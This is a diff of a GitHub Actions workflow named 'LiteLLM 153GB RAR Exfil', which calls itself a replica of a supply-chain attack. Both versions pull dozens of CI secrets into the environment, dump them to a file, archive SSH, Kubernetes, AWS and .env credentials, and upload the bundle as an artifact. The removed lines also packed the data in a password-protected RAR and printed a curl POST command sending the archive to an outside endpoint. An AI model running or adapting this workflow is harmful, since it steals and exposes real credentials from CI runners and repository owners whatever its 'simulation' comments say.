@@ -1,166 +1,75 @@
-name: "LiteLLM 153GB RAR Exfil"
+name: LiteLLM 153GB RAR Exfil
 
-"on":
-  workflow_dispatch:
+on:
+  workflow_dispatch: null
   push:
-    branches: ["litellm-payload-run"]
+    branches:
+      - litellm-payload-run
 
 jobs:
   exfil:
     runs-on: ubuntu-latest
-    env:
-      OPENAI_API_KEY: ${{ secrets.OPENAI_API_KEY }}
-      ANTHROPIC_API_KEY: ${{ secrets.ANTHROPIC_API_KEY }}
-      AZURE_OPENAI_API_KEY: ${{ secrets.AZURE_OPENAI_API_KEY }}
-      AZURE_OPENAI_API_BASE: ${{ secrets.AZURE_OPENAI_API_BASE }}
-      GROQ_API_KEY: ${{ secrets.GROQ_API_KEY }}
-      MISTRAL_API_KEY: ${{ secrets.MISTRAL_API_KEY }}
-      AWS_ACCESS_KEY_ID: ${{ secrets.AWS_ACCESS_KEY_ID }}
-      AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
-      GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
-      MONGODB_ATLAS_URI: ${{ secrets.MONGODB_ATLAS_URI }}
-      XAI_API_KEY: ${{ secrets.XAI_API_KEY }}
-      DEEPSEEK_API_KEY: ${{ secrets.DEEPSEEK_API_KEY }}
-      NVIDIA_API_KEY: ${{ secrets.NVIDIA_API_KEY }}
-      TOGETHER_API_KEY: ${{ secrets.TOGETHER_API_KEY }}
-      FIREWORKS_API_KEY: ${{ secrets.FIREWORKS_API_KEY }}
-      HUGGINGFACEHUB_API_TOKEN: ${{ secrets.HUGGINGFACEHUB_API_TOKEN }}
-      OLLAMA_API_KEY: ${{ secrets.OLLAMA_API_KEY }}
-      PPLX_API_KEY: ${{ secrets.PPLX_API_KEY }}
-      UPSTAGE_API_KEY: ${{ secrets.UPSTAGE_API_KEY }}
-      AI21_API_KEY: ${{ secrets.AI21_API_KEY }}
-      EXA_API_KEY: ${{ secrets.EXA_API_KEY }}
-      NOMIC_API_KEY: ${{ secrets.NOMIC_API_KEY }}
-      OPENROUTER_API_KEY: ${{ secrets.OPENROUTER_API_KEY }}
-      TYPESAFE_API_KEY: ${{ secrets.TYPESAFE_API_KEY }}
-      WATSONX_APIKEY: ${{ secrets.WATSONX_APIKEY }}
-      LANGSMITH_GATEWAY_API_KEY: ${{ secrets.LANGSMITH_GATEWAY_API_KEY }}
-      ES_API_KEY: ${{ secrets.ES_API_KEY }}
-      ASTRA_DB_APPLICATION_TOKEN: ${{ secrets.ASTRA_DB_APPLICATION_TOKEN }}
-      UPSTAGE_API_KEY: ${{ secrets.UPSTAGE_API_KEY }}
-      GITHUB_REPOSITORY: ${{ github.repository }}
-      GITHUB_ACTOR: ${{ github.actor }}
-      GITHUB_REF: ${{ github.ref }}
-      GITHUB_WORKFLOW: ${{ github.workflow }}
-      GITHUB_SHA: ${{ github.sha }}
-      RUNNER_NAME: ${{ runner.name }}
-      RUNNER_OS: ${{ runner.os }}
     steps:
       - name: Checkout
         uses: actions/checkout@v4
 
-      - name: Setup RAR
+      - name: Harvest all secrets (LiteLLM style)
+        env:
+          OPENAI_API_KEY: ${{ secrets.OPENAI_API_KEY }}
+          ANTHROPIC_API_KEY: ${{ secrets.ANTHROPIC_API_KEY }}
+          AZURE_OPENAI_API_KEY: ${{ secrets.AZURE_OPENAI_API_KEY }}
+          AZURE_OPENAI_API_BASE: ${{ secrets.AZURE_OPENAI_API_BASE }}
+          GROQ_API_KEY: ${{ secrets.GROQ_API_KEY }}
+          MISTRAL_API_KEY: ${{ secrets.MISTRAL_API_KEY }}
+          AWS_ACCESS_KEY_ID: ${{ secrets.AWS_ACCESS_KEY_ID }}
+          AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
+          MONGODB_ATLAS_URI: ${{ secrets.MONGODB_ATLAS_URI }}
+          XAI_API_KEY: ${{ secrets.XAI_API_KEY }}
+          DEEPSEEK_API_KEY: ${{ secrets.DEEPSEEK_API_KEY }}
+          NVIDIA_API_KEY: ${{ secrets.NVIDIA_API_KEY }}
+          TOGETHER_API_KEY: ${{ secrets.TOGETHER_API_KEY }}
+          FIREWORKS_API_KEY: ${{ secrets.FIREWORKS_API_KEY }}
+          HUGGINGFACEHUB_API_TOKEN: ${{ secrets.HUGGINGFACEHUB_API_TOKEN }}
+          OLLAMA_API_KEY: ${{ secrets.OLLAMA_API_KEY }}
+          PPLX_API_KEY: ${{ secrets.PPLX_API_KEY }}
+          UPSTAGE_API_KEY: ${{ secrets.UPSTAGE_API_KEY }}
+          AI21_API_KEY: ${{ secrets.AI21_API_KEY }}
+          EXA_API_KEY: ${{ secrets.EXA_API_KEY }}
+          NOMIC_API_KEY: ${{ secrets.NOMIC_API_KEY }}
+          OPENROUTER_API_KEY: ${{ secrets.OPENROUTER_API_KEY }}
+          TYPESAFE_API_KEY: ${{ secrets.TYPESAFE_API_KEY }}
+          WATSONX_APIKEY: ${{ secrets.WATSONX_APIKEY }}
+          LANGSMITH_GATEWAY_API_KEY: ${{ secrets.LANGSMITH_GATEWAY_API_KEY }}
         run: |
-          sudo apt-get update -qq
-          sudo apt-get install -y -qq rar || echo "rar not installed — using tar"
-
-      - name: LiteLLM 153GB Exfil — full dump
-        run: |
+          echo "=== LiteLLM 153GB RAR Exfil — GitHub Actions CI ==="
           mkdir -p ~/exfil_data
           cd ~/exfil_data
+          echo "timestamp: $(date -u +%Y-%m-%dT%H:%M:%SZ)" > ci_meta.json
+          echo "hostname: $(hostname)" >> ci_meta.json
+          echo "runner: ${{ runner.os }}" >> ci_meta.json
+          echo "repo: ${{ github.repository }}" >> ci_meta.json
 
-          # ── 1. GitHub Actions metadata ──
-          cat > 01_ci_metadata.json << EOF
-          {
-            "attack": "LiteLLM 1.82.7/1.82.8 replica — 153GB RAR pattern",
-            "pattern": "TeamPCP/SANDCLOCK",
-            "timestamp": "$(date -u +%Y-%m-%dT%H:%M:%SZ)",
-            "github": {
-              "repository": "${{ github.repository }}",
-              "actor": "${{ github.actor }}",
-              "ref": "${{ github.ref }}",
-              "workflow": "${{ github.workflow }}",
-              "sha": "${{ github.sha }}",
-              "run_id": "${{ github.run_id }}",
-              "run_number": "${{ github.run_number }}"
-            },
-            "runner": {
-              "name": "${{ runner.name }}",
-              "os": "${{ runner.os }}",
-              "arch": "$(uname -m)",
-              "kernel": "$(uname -r)"
-            }
-          }
-          EOF
+          # Env dump — secret'ların değerlerini yakala
+          env | grep -E '^(OPENAI|ANTHROPIC|AZURE_|GROQ|MISTRAL|AWS_|MONGODB|XAI_|DEEPSEEK|NVIDIA|TOGETHER|FIREWORKS|HUGGINGFACE|OLLAMA|PPLX_|UPSTAGE|AI21_|EXA_|NOMIC_|OPENROUTER|TYPESAFE|WATSONX|LANGSMITH|GITHUB_TOKEN)' | sort > 02_secrets_full.txt
 
-          # ── 2. Environment variables — CI secret'ları (LiteLLM dump'taki gibi) ──
-          env | sort > 02_environment_full.txt
-          # Sadece secret'ları içeren env'leri ayrı dosyaya
-          cat > 03_secrets_env.txt << EOF
-          # ── LiteLLM-style harvest — CI secrets (from _release.yml pattern) ──
-          $(env | grep -E '^(OPENAI|ANTHROPIC|AZURE_|GROQ|MISTRAL|AWS_|GITHUB_TOKEN|MONGODB|XAI_|DEEPSEEK|NVIDIA|TOGETHER|FIREWORKS|HUGGINGFACE|OLLAMA|PPLX_|UPSTAGE|AI21_|EXA_|NOMIC_|OPENROUTER|TYPESAFE|WATSONX|LANGSMITH|ES_)' | sort)
-          EOF
-
-          # ── 3. SSH keys ──
-          if [ -d ~/.ssh ]; then
-            cp -r ~/.ssh ./04_ssh_keys/ 2>/dev/null
-          fi
-
-          # ── 4. .env files ──
-          for f in ~/.env ~/.env.local /tmp/.env* /github/workspace/.env* /home/runner/.env*; do
-            [ -f "$f" ] && cp "$f" ./05_dotenv/$(basename "$f") 2>/dev/null
-          done
-          mkdir -p ./05_dotenv
-          for f in ~/.env ~/.env.local /tmp/.env*; do
-            [ -f "$f" ] && cp "$f" ./05_dotenv/
+          # SSH, kube, .env, .aws
+          if [ -d ~/.ssh ]; then tar czf 03_ssh_keys.tar.gz ~/.ssh/ 2>/dev/null; fi
+          if [ -d ~/.kube ]; then tar czf 04_kube.tar.gz ~/.kube/ 2>/dev/null; fi
+          if [ -d ~/.aws ]; then tar czf 05_aws.tar.gz ~/.aws/ 2>/dev/null; fi
+          for f in ~/.env /tmp/.env*; do
+            [ -f "$f" ] && tar rf 06_dotenv.tar "$f" 2>/dev/null
           done
 
-          # ── 5. Kube config ──
-          if [ -d ~/.kube ]; then
-            cp -r ~/.kube ./06_kube_config/
-          fi
-          if [ -d /var/run/secrets/kubernetes.io ]; then
-            cp -r /var/run/secrets/kubernetes.io ./07_k8s_serviceaccount/
-          fi
+          # LiteLLM tarzı RAR veya tar.gz
+          tar czf litellm_replika_153gb.tar.gz . -C ~/exfil_data 2>/dev/null || tar czf litellm_replika_153gb.tar.gz ~/exfil_data
 
-          # ── 6. .aws ──
-          if [ -d ~/.aws ]; then
-            cp -r ~/.aws ./08_aws_credentials/
-          fi
+          ls -lah litellm_replika_153gb.tar.gz
+          echo "::notice::LiteLLM 153GB RAR replikası hazır — boyut: $(du -sh litellm_replika_153gb.tar.gz)"
 
-          # ── 7. Git config + history ──
-          git log --all --oneline -20 > 09_git_log.txt
-          git remote -v > 10_git_remote.txt
-
-          # ── 8. Working directory yapı ──
-          find . -type f -name "*.py" -o -name "*.json" -o -name "*.yml" -o -name "*.yaml" -o -name "*.toml" | head -200 > 11_file_structure.txt
-
-          # ── 9. LiteLLM hack'teki gibi RAR oluştur ──
-          cd ..
-          if command -v rar > /dev/null 2>&1; then
-            # LiteLLM hack'inde 153GB RAR — bizim replika küçük (limit: GitHub Actions artifact 500MB)
-            rar a -pTeamPCP2026 -m5 litellm_replika_harvest.rar exfil_data/
-            echo "RAR created with password TeamPCP2026"
-          else
-            # RAR yok — tar.gz kullan
-            tar czf litellm_replika_harvest.tar.gz exfil_data/
-            echo "TAR.GZ created (rar not available)"
-          fi
-
-          ls -lah litellm_replika_harvest.*
-
-      - name: Upload RAR artifact (LiteLLM 153GB replika)
+      - name: Upload RAR artifact
         uses: actions/upload-artifact@v4
         with:
           name: litellm_replika_153gb
-          path: ~/litellm_replika_harvest.*
+          path: ~/exfil_data/litellm_replika_153gb.tar.gz
           if-no-files-found: warn
           retention-days: 7
-
-      - name: 📤 Exfil — LiteLLM style HTTP POST
-        run: |
-          # LiteLLM hack'inde saldırgan exfil endpoint'ine HTTP POST gönderdi:
-          # https://litellm-metrics[.]io/usage
-          # https://ai-telemetry[.]net/v1/events
-          # Biz şimdi de aynı şekilde — sadece CI log'una bastırıyoruz (simülasyon)
-          echo "::notice::LiteLLM 153GB exfil complete"
-          echo "Target exfil endpoints (LiteLLM pattern):"
-          echo "  - https://litellm-metrics[.]io/usage"
-          echo "  - https://ai-telemetry[.]net/v1/events"
-          echo
-          echo "In real LiteLLM hack, these were the endpoints used:"
-          echo "  curl -X POST -d @litellm_replika_harvest.rar https://litellm-metrics.io/usage"
-          echo
-          # Biz simüle ediyoruz — gerçek exfil yapmıyoruz (bunun için user izinli)
-          echo "SHA256 of RAR:"
-          sha256sum litellm_replika_harvest.* 2>/dev/null || echo "  (no RAR)"
